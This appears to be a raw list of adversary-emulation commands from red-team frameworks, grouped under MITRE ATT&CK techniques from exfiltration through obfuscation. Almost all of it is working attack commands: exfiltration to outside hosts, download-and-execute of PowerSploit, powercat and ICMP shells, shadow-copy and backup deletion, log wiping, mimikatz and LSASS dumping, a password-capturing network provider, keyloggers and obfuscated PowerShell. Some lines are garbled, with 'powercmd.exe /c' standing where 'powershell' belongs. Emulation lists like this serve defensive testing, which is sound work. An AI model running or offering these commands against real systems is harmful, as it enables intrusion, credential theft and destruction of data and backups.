* ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
* Import-Module #{ps_module}
Invoke-DNSExfiltrator -i #{ps_module} -d target.example.com -p #{password} -doh #{doh} -t #{time} #{encoding}
* tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh atomic@#{domain} 'cat > /Users.tar.gz.enc'
* Import-Module #{ps_module}
Invoke-DNSExfiltrator -i #{ps_module} -d #{domain} -p #{password} -doh google -t #{time} #{encoding}
* tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
* tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@target.example.com 'cat > /Users.tar.gz.enc'
* Import-Module $env:Temp\dnsexfil.ps1
Invoke-DNSExfiltrator -i $env:Temp\dnsexfil.ps1 -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}
* powercmd.exe /c/exfiltration/exfil_dropbox
* exfiltration/Invoke_ExfilDataToGitHub
## T1041: Exfiltration Over C2 Channel
* [System.Net.ServicePointManager]::Expect100Continue = $false
$filecontent = Get-Content -Path C:\Users\$env:UserName\LineNumbers.txt
Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
* [System.Net.ServicePointManager]::Expect100Continue = $false
$filecontent = Get-Content -Path #{filepath}
Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive
* $ErrorActionPreference = 'Stop';
$fieldName = '#{host.dir.compress}';
$filePath = '#{host.dir.compress}';
$url = "$RANDOMURL$/file/upload";

Add-Type -AssemblyName 'System.Net.Http';

$client = New-Object System.Net.Http.HttpClient;
$content = New-Object System.Net.Http.MultipartFormDataContent;
$fileStream = [System.IO.File]::OpenRead($filePath);
$fileName = [System.IO.Path]::GetFileName($filePath);
$fileContent = New-Object System.Net.Http.StreamContent($fileStream);
$content.Add($fileContent, $fieldName, $fileName);
$client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{paw}');
$client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");

$result = $client.PostAsync($url, $content).Result;
$result.EnsureSuccessStatusCode();
* curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" $RANDOMURL$/file/upload
## T1011: Exfiltration Over Other Network Medium
## T1052: Exfiltration Over Physical Medium
## T1567: Exfiltration Over Web Service
* $path = resolve-path "c:\ProgramData\Microsoft\Windows Defender\Platform\*\ConfigSecurityPolicy.exe"
& $path[0] c:\temp\config.xml "https://webhook.site?d=sensitive-data-here"
## T1190: Exploit Public-Facing Application
* powercmd.exe /c/lateral_movement/jenkins_script_console
* python/exploit/web/jboss_jmx
## T1203: Exploitation for Client Execution
## T1212: Exploitation for Credential Access
## T1211: Exploitation for Defense Evasion
## T1068: Exploitation for Privilege Escalation
* getsystem
* bitsadmin.exe
* msbuild.exe *MSBuildShell.csproj
* powercmd.exe /c/privesc/ms16-032
* powercmd.exe /c/privesc/tater
* powercmd.exe /c/privesc/ms16-135
## T1210: Exploitation of Remote Services
* powercmd.exe /c/exploitation/exploit_jboss
* powercmd.exe /c/exploitation/exploit_jenkins
* powercmd.exe /c/exploitation/exploit_eternalblue
## T1133: External Remote Services
* $extList = "fcfhplploccackoneaefokcmbjfbkenj", "fdcgdnkidjaadafnichfpabhfomcebme"

foreach ($extension in $extList) {
  New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
  New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
Start chrome
Start-Sleep -Seconds 30
Stop-Process -Name "chrome"
* $extList = #{extension_id}
foreach ($extension in $extList) {
  New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
  New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
Start chrome
Start-Sleep -Seconds 30
Stop-Process -Name "chrome"
## T1008: Fallback Channels
* powercmd.exe /c/management/switch_listener
* external/generate_agent
## T1083: File and Directory Discovery
* cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt
if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;
find . -type f -iname *.pdf >> /tmp/T1083.txt
cat /tmp/T1083.txt
find . -type f -name ".*"
* ls -recurse
get-childitem -recurse
gci -recurse
* ls -a >> /tmp/T1083.txt
if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi;
file */* *>> /tmp/T1083.txt
cat /tmp/T1083.txt 2>/dev/null
find . -type f
ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
locate *
which sh
* dir /s c:\ >> %temp%\download
dir /s "c:\Documents and Settings" >> %temp%\download
dir /s "c:\Program Files\" >> %temp%\download
dir "%systemdrive%\Users\*.*" >> %temp%\download
dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> %temp%\download
dir "%userprofile%\Desktop\*.*" >> %temp%\download
tree /F >> %temp%\download
* Get-ChildItem -Path #{host.system.path}
* dir
* ls
* pwd
* find ~ -type f -name #{host.print.file} 2>/dev/null
* powercmd.exe /c/collection/file_finder
* powercmd.exe /c/collection/find_interesting_file
* powercmd.exe /c/collection/get_indexed_item
## T1222: File and Directory Permissions Modification
* ```
* chmod o-x test1.txt
* chown ec2-user:ec2-user test1.txt
* chmod u+x test1.txt
* chmod 766 test1.txt
## T1495: Firmware Corruption
## T1187: Forced Authentication
* & "#{petitpotam_path}" #{captureServerIP} 10.0.0.2 #{efsApi}
Write-Host "End of PetitPotam attack"
* & "#{petitpotam_path}" 10.0.0.3 #{targetServerIP} #{efsApi}
Write-Host "End of PetitPotam attack"
* & "$env:TEMP\PetitPotam.exe" #{captureServerIP} #{targetServerIP} #{efsApi}
Write-Host "End of PetitPotam attack"
* powercmd.exe /c/lateral_movement/invoke_smbexec
## T1606: Forge Web Credentials
## T1592: Gather Victim Host Information
## T1589: Gather Victim Identity Information
## T1590: Gather Victim Network Information
## T1591: Gather Victim Org Information
## T1061: Graphical User Interface
## T1615: Group Policy Discovery
## T1200: Hardware Additions
## T1564: Hide Artifacts
* net user $ ATOMIC123! /add /active:yes
* New-LocalUser -Name "Administrator " -NoPassword
## T1574: Hijack Execution Flow
## T1062: Hypervisor
## T1562: Impair Defenses
## T1525: Implant Internal Image
## T1070: Indicator Removal on Host
* fsutil usn deletejournal /D C:
* fsutil.exe usn deletejournal /D
* vssadmin.exe delete shadows /all /quiet
* wbadmin.exe delete catalog -quiet
* wevtutil.exe /cl
* wmic.exe /NODE:*shadowcopy delete *
* fsutil|usn|deletejournal
* wevtutil|cl
* wevtutilcl
* fsutilusn|deletejournal
* powercmd.exe /c/credentials/mimikatz/purge
* powercmd.exe /c/management/lock
* powercmd.exe /c/management/logoff
* powercmd.exe /c/management/restart
* python/persistence/osx/RemoveDaemon
* rm -rf /var/log/*
* ```
## T1202: Indirect Command Execution
* conhost.exe "notepad.exe"
* pcalua.exe -a #{process}
pcalua.exe -a C:\Windows\System32\calc.exe
* pcalua.exe -a calc.exe
pcalua.exe -a #{payload_path}
* forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
forfiles /p c:\windows\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe"
* pcalua.exe
## T1105: Ingress Tool Transfer
* scp #{username}@adversary-host:#{remote_file} #{local_path}
* rsync -r adversary@#{remote_host}:#{remote_path} #{local_path}
* copy C:\Windows\System32\cmd.exe C:\svchost.exe
C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt
* #{curl_path} -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll
#{curl_path} -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll
#{curl_path} -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll
#{curl_path} -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll
* rsync -r #{username}@#{remote_host}:/tmp/adversary-rsync/ #{local_path}
* rsync -r #{local_path} victim@#{remote_host}:#{remote_path}
* $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"
& $imewdbled #{remote_url}
* C:\Windows\System32\Curl.exe -k #{file_download} -o c:\users\public\music\allthethingsx64.dll
C:\Windows\System32\Curl.exe -k #{file_download} --output c:\users\public\music\allthethingsx64.dll
C:\Windows\System32\Curl.exe -k #{file_download} -o c:\programdata\allthethingsx64.dll
C:\Windows\System32\Curl.exe -k #{file_download} -o %Temp%\allthethingsx64.dll
* $datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
* scp #{username}@#{remote_host}:/tmp/adversary-scp #{local_path}
* timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} "#{query}" > /tmp/T1105.whois.out
* rsync -r #{username}@adversary-host:#{remote_path} #{local_path}
* sftp #{username}@#{remote_host}:/tmp/adversary-sftp #{local_path}
* (New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt
* scp #{local_file} #{username}@victim-host:#{remote_path}
* cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
MpCmdRun.exe -DownloadFile -url #{remote_file} -path %temp%\Atomic-license.txt
* timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} "Hello from Atomic Red Team test T1105" > #{output_file}
* (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File #{output_file}; Invoke-Item #{output_file}
* pushd \\localhost\C$
echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
CScript.exe AtomicTestT1105.js //E:JScript
del AtomicTestT1105.js /Q >nul 2>&1
del AtomicTestFileT1105.js /Q >nul 2>&1
popd
* C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} %temp%\Atomic-license.txt
* sftp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
* scp /tmp/adversary-scp #{username}@#{remote_host}:#{remote_path}
* rsync -r #{username}@#{remote_host}:#{remote_path} /tmp/victim-files
* cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path #{local_path}
* timeout --preserve-status #{timeout} whois -h localhost -p #{remote_port} "#{query}" > #{output_file}
* C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}
* rsync -r #{local_path} #{username}@#{remote_host}:/tmp/victim-files
* cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}
* $datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f #{remote_file}
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
* sftp adversary@#{remote_host}:#{remote_file} #{local_path}
* sftp #{username}@#{remote_host}:/tmp/victim-files/ <<< $'put #{local_file}'
* rsync -r #{local_path} #{username}@victim-host:#{remote_path}
* (New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "$env:TEMP\Atomic-license.txt")
* (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "#{destination_path}")
* cmd /c certutil -urlcache -split -f #{remote_file} Atomic-license.txt
* sftp victim@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
* sftp #{username}@adversary-host:#{remote_file} #{local_path}
* sftp #{username}@victim-host:#{remote_path} <<< $'put #{local_file}'
* finger base64_filedata@localhost
* $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"
& $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml
* scp adversary@#{remote_host}:#{remote_file} #{local_path}
* sftp #{username}@#{remote_host}:#{remote_path} <<< $'put /tmp/adversary-sftp'
* scp #{local_file} victim@#{remote_host}:#{remote_path}
* scp #{local_file} #{username}@#{remote_host}:/tmp/victim-files/
* C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} #{local_path}
* scp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
* rsync -r /tmp/adversary-rsync/ #{username}@#{remote_host}:#{remote_path}
* $wc=New-Object System.Net.WebClient;
$output="PowerShellCore.msi";
$wc.DownloadFile("https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi", $output);
Start-Process msiexec.exe -ArgumentList "/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1" -Wait;
$env:Path += ";C:\Program Files\Powercmd.exe /c\6";
Start-Process pwsh -ArgumentList "-c #{location} -server $RANDOMURL$ - group 1010" -WindowStyle hidden;
* [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
$web = (New-Object System.Net.WebClient);
$result = $web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip", "PSTools.zip");
New-Item -ItemType "directory" C:\Windows\System32\PSTools -Force;
Add-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", "C:\Windows\System32\PSTools");
## T1490: Inhibit System Recovery
* schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable
* vssadmin.exe delete shadows /all /quiet
* Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
* del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
* wmic.exe shadowcopy delete
* wbadmin delete catalog -quiet
* bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
bcdedit.exe /set {default} recoveryenabled no
* wbadmin delete systemstatebackup -keepVersions:0
## T1056: Input Capture
* starting the keylogger:
keyscan_start
when you're ready to get the logs:
keyscan_dump
when you're done keylogging:
keyscan_stop
* starting the keylogger:
keylogger {x86|x64} {pid}
when you're ready to view logs:
view -> keylog
when you're done keylogging:
jobs
jobkill {job id number}
* powercmd.exe /c.exe Get-Keystrokes -LogPath C:\key.log
* powercmd.exe /c/collection/USBKeylogger
* powercmd.exe /c/collection/keylogger
* python/collection/linux/keylogger
* python/collection/linux/xkeylogger
* python/collection/osx/keylogger
## T1559: Inter-Process Communication
## T1534: Internal Spearphishing
## T1149: LC_MAIN Hijacking
## T1570: Lateral Tool Transfer
* $job = Start-Job -ScriptBlock {
  $username = "$USER$";
  $password = "$PASSWORD$";
  $secstr = New-Object -TypeName System.Security.SecureString;
  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
  $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
  $location = "#{location}";
  $exe = "#{exe_name}";
  Copy-Item $location -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
  Start-Sleep -s 5;
  Remove-PSSession -Session $session;
};
Receive-Job -Job $job -Wait;
* scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go
* scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go
* net /y use \\#{remote.host.name} & copy /y sandcat.go-windows
\\#{remote.host.name}\Users\Public & #{psexec.path} -accepteula \\#{remote.host.name}
cmd /c start C:\Users\Public\sandcat.go-windows -server $RANDOMURL$ -v
## T1036: Masquerading
* copy %WINDIR%\System32\cmd.exe /Y %ALLUSERSPROFILE%\cmd.exe
start %ALLUSERSPROFILE%\cmd.exe
* \Recycle.bin
* *.exe
* \Users\All Users\
* *.exe
* \Users\Default\
* *.exe
* \Users\Public\
* *.exe
* \Perflogs\
* *.exe
* \config\systemprofile\
* *.exe
* \Windows\Fonts\
* *.exe
* \Windows\IME\
* *.exe
* \Windows\addins\
* *.exe
* \ProgramData\
* *.exe
* csrsr.exe
* !=*\Windows\System32\
* csrss.exe
* cssrss.exe
* !=*\Windows\System32\
* explorer.exe
* iexplore.exe
* isass.exe
* lexplore.exe
* !=*\Windows\System32\
* lsm.exe
* lssass.exe
* !=*\Windows\System32\
* mmc.exe
* lsass
* !=wininit.exe
* run32dll.exe
* rundII.exe
* scvhost.exe
* smss.exe
* svchost.exe
* !=services.exe
* svchosts.exe
## T1556: Modify Authentication Process
## T1578: Modify Cloud Compute Infrastructure
## T1112: Modify Registry
* reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
* New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name T1112 -Value "<script>"
* $key= "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\bad-domain.com\"
$name ="bad-subdomain"
new-item $key -Name $name -Force
new-itemproperty $key$name -Name https -Value 2 -Type DWORD;
new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;
* reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
* reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f
* Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
* powercmd.exe /c/persistence/misc/disable_machine_acct_change
## T1601: Modify System Image
## T1104: Multi-Stage Channels
## T1026: Multiband Communication
## T1106: Native API
* C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"%tmp%\T1106.exe" /target:exe #{source_file}
%tmp%/T1106.exe
## T1599: Network Boundary Bridging
## T1498: Network Denial of Service
## T1046: Network Service Scanning
* nmap #{host_to_scan}
* for port in {1..65535};
do
  echo >/dev/tcp/192.168.1.1/$port && echo "port $port is open" || echo "port $port is closed" : ;
done
* nmap -sS #{network_range} -p #{port}
telnet 192.168.1.1 #{port}
nc -nv 192.168.1.1 #{port}
* nmap -sS #{network_range} -p 80
telnet #{host} 80
nc -nv #{host} 80
* nmap 127.0.0.1
* python #{filename} -i 127.0.0.1
* nmap -sS 192.168.1.0/24 -p #{port}
telnet #{host} #{port}
nc -nv #{host} #{port}
* nmap -sV -p #{remote.host.port} #{remote.host.ip}
* python3 scanner.py -i #{remote.host.ip}
* Import-Module ./basic_scanner.ps1;
$ports = @(22, 53, 80, 445);
Get-NetIPConfiguration | ?{$_.NetAdapter.Status -ne "Disconnected"} | Get-NetIPaddress -AddressFamily IPv4 | %{
    $ipv4 = $_.IPAddress;
    $prefixLength = $_.PrefixLength;
    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;
};
* rcpping.exe -s 127.0.0.1 -t ncacn_np
* rcpping.exe -s 127.0.0.1 -e 1234 -a privacy -u NTLM
* powercmd.exe /c/recon/find_fruit
## T1135: Network Share Discovery
* net share
* auxiliary/scanner/smb/smb_enumshares
* net view \\host /all [/domain:domain]
* auxiliary/scanner/smb/smb_enumshares
* net view \\host /domain
* get-smbshare
* [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
* net view \\localhost
* df -aH
smbutil view -g //computer1
showmount computer1
* net share
* smbstatus --shares
* Get-SmbShare | ConvertTo-Json
* net view \\$TARGET$ /all
## T1040: Network Sniffing
* netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10
* tcpdump -c 5 -nnni ens33
tshark -c 5 -i ens33
* "c:\Program Files\Wireshark\tshark.exe" -i Ethernet -c 5
* "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
* tcpdump -i en0 & sleep 5; kill $!
* $path = "$ENV:UserProfile\Desktop\pcap.etl";
New-NetEventSession -Name "PCAP" -CaptureMode SaveToFile -LocalFilePath $path;
Add-NetEventProvider -Name "Microsoft-Windows-TCPIP" -SessionName "PCAP";
Start-NetEventSession -Name "PCAP";
Start-Sleep -s 60;
Stop-NetEventSession -Name "PCAP";
if (Test-Path $path) {
  echo $path;
  exit 0;
} else {
  echo "Failed to generate PCAP file.";
  exit 1;
};
* powercmd.exe /c/collection/packet_capture
* python/collection/linux/sniffer
* python/collection/osx/sniffer
* tshark -c 5 -i #{interface}
* tcpdump -c 5 -nnni #{interface}
## T1095: Non-Application Layer Protocol
* IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c 127.0.0.1 -p #{server_port}
* cmd /c #{ncat_exe} 127.0.0.1 #{server_port}
* cmd /c #{ncat_exe} #{server_ip} #{server_port}
* cmd /c $env:TEMP\T1095\nmap-7.80\ncat.exe #{server_ip} #{server_port}
* IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress 127.0.0.1
## T1571: Non-Standard Port
* Test-NetConnection -ComputerName #{domain} -port 8081
* telnet #{domain} 8081
* Test-NetConnection -ComputerName google.com -port #{port}
* telnet google.com #{port}
## T1003: OS Credential Dumping
* hashdump
mimikatz !lsadump::sam
* logonpasswords
mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::msv
mimikatz !sekurlsa::kerberos
mimikatz !sekurlsa::wdigest
* use mimikatz
wdigest
msv
kerberos
logonpasswords
* #{gsecdump_exe} -a
* Copy-Item "$env:Temp\NPPSPY.dll" -Destination "C:\Windows\System32"
$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore
echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
* $ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
* .\totallylegit.exe #{host.process.id} C:\Users\Public\creds.dmp
* ntdsutil.exe
* HKLM\SAM|HKLM\Security\\Windows\\.+\\lsass.exe
* \\Windows\\.+\\bcryptprimitives.dll|\\Windows\\.+\\bcrypt.dll|\\Windows\\.+\\ncrypt.dll
* powercmd.exe /c/collection/ChromeDump
* powercmd.exe /c/collection/FoxDump
* powercmd.exe /c/collection/ninjacopy
* powercmd.exe /c/collection/vaults/add_keepass_config_trigger
* powercmd.exe /c/collection/vaults/find_keepass_config
* powercmd.exe /c/collection/vaults/get_keepass_config_trigger
* powercmd.exe /c/collection/vaults/keethief
* powercmd.exe /c/collection/vaults/remove_keepass_config_trigger
* powercmd.exe /c/credentials/enum_cred_store
* powercmd.exe /c/credentials/mimikatz/cache
* powercmd.exe /c/credentials/mimikatz/command
* powercmd.exe /c/credentials/mimikatz/dcsync
* powercmd.exe /c/credentials/mimikatz/dcsync_hashdump
* powercmd.exe /c/credentials/mimikatz/extract_tickets
* powercmd.exe /c/credentials/mimikatz/golden_ticket
* powercmd.exe /c/credentials/mimikatz/logonpasswords
* powercmd.exe /c/credentials/mimikatz/lsadump
* powercmd.exe /c/credentials/mimikatz/mimitokens
* powercmd.exe /c/credentials/mimikatz/sam
* powercmd.exe /c/credentials/mimikatz/silver_ticket
* powercmd.exe /c/credentials/mimikatz/trust_keys
* powercmd.exe /c/credentials/powerdump
* powercmd.exe /c/credentials/vault_credential
* powercmd.exe /c/management/downgrade_account
* powercmd.exe /c/management/wdigest_downgrade
* powercmd.exe /c/privesc/gpp
* powercmd.exe /c/privesc/mcafee_sitelist
* python/collection/linux/hashdump
* python/collection/linux/mimipenguin
* python/collection/osx/hashdump
* python/collection/osx/kerberosdump
* python/management/multi/kerberos_inject
## T1027: Obfuscated Files or Information
* cmd /c certutil urlcache  split "" #{remote_file} Atomic-license.txt
* cmd /c certutil urlcache  split "" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}
* $OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
powercmd.exe /c.exe -EncodedCommand $EncodedCommand
* $cmDwhy =[TyPe]("{0}{1}" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE]("{1}{0}{2}"-f'nv','cO','ert')  ;  &("{0}{2}{3}{1}{4}" -f'In','SiO','vOKe-EXp','ReS','n') (  (&("{1}{2}{0}"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y'))."v`ALUe"::("{1}{0}" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::"t`OinT`16"(( [sTring]${_}) ,8)))})) )
* Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments #{input_file} -SmtpServer 127.0.0.1
* Send-MailMessage -From #{sender} -To test@corp.com -Subject 'T1027_Atomic_Test' -Attachments #{input_file} -SmtpServer #{smtp_server}
* $OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
powercmd.exe /c.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"
* Send-MailMessage -From test@corp.com -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments #{input_file} -SmtpServer #{smtp_server}
* $OriginalCommand = '#{powercmd.exe /c_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand
powercmd.exe /c.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))"
* $OriginalCommand = '#{powercmd.exe /c_command}'
